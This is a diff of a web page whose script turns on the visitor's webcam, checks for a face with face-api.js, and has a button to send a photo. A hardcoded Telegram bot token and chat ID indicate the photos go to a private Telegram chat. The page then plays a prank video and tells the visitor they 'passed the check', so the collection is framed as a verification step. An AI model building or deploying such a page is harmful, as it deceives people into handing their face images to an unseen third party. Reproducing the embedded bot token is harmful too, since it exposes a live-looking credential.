@@ -104,7 +104,7 @@
     <div class="video-wrapper">
         <video id="video" autoplay playsinline></video>
         <canvas id="overlay"></canvas>
-        <video id="rickroll" src="https://www.w3schools.com/html/mov_bbb.mp4" muted playsinline></video>
+        <video id="rickroll" src="https://filesamples.com/samples/video/mp4/sample_640x360.mp4" muted playsinline></video>
     </div>
 
     <button class="btn" id="sendBtn" disabled>📸 Отправить фото</button>
@@ -114,10 +114,10 @@
 
 <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <script>
-    // ===== ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ) =====
+    // ===== ТВОИ ДАННЫЕ =====
     const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
     const CHAT_ID = '5025315928';
-    // ====================================
+    // =======================
 
     const video = document.getElementById('video');
     const rickroll = document.getElementById('rickroll');
@@ -130,7 +130,6 @@
     let faceDetected = false;
     let rickrollPlayed = false;
 
-    // === ЗАГРУЗКА МОДЕЛИ ===
     async function loadModels() {
         status.textContent = '⏳ Загрузка модели распознавания лиц...';
         try {
@@ -144,7 +143,6 @@
         }
     }
 
-    // === КАМЕРА ===
     async function startCam() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -159,7 +157,6 @@
         }
     }
 
-    // === РАСПОЗНАВАНИЕ ЛИЦА ===
     async function detectFace() {
         setInterval(async () => {
             if (rickrollPlayed) return;
@@ -188,7 +185,6 @@
         }, 400);
     }
 
-    // === ОТПРАВКА ФОТО ===
     async function snap() {
         if (!faceDetected) {
             status.textContent = '❌ Лицо не обнаружено. Попробуйте ещё раз.';
@@ -227,33 +223,29 @@
         }
     }
 
-    // === РИКРОЛЛ (ВИДЕО) ===
     function playRickroll() {
         rickrollPlayed = true;
 
-        // Останавливаем камеру
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
         }
         video.style.display = 'none';
         overlay.style.display = 'none';
 
-        // Показываем видео
         rickroll.style.display = 'block';
-        rickroll.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ';
-        rickroll.play();
+        rickroll.muted = false;
+        rickroll.volume = 1.0;
+        rickroll.play().catch(() => {
+            // Если автозапуск запрещён — показываем кнопку "Нажать для просмотра"
+            status.textContent = '🎵 Нажмите на видео, чтобы запустить';
+        });
 
         status.textContent = '🎵 Добро пожаловать!';
-
-        // Убираем лишние кнопки
         document.querySelector('.sub').textContent = '🎉 Вы прошли проверку!';
         sendBtn.style.display = 'none';
     }
 
-    // === КНОПКА ОТПРАВКИ ===
     sendBtn.onclick = snap;
-
-    // === СТАРТ ===
     loadModels();
 </script>
 </body>
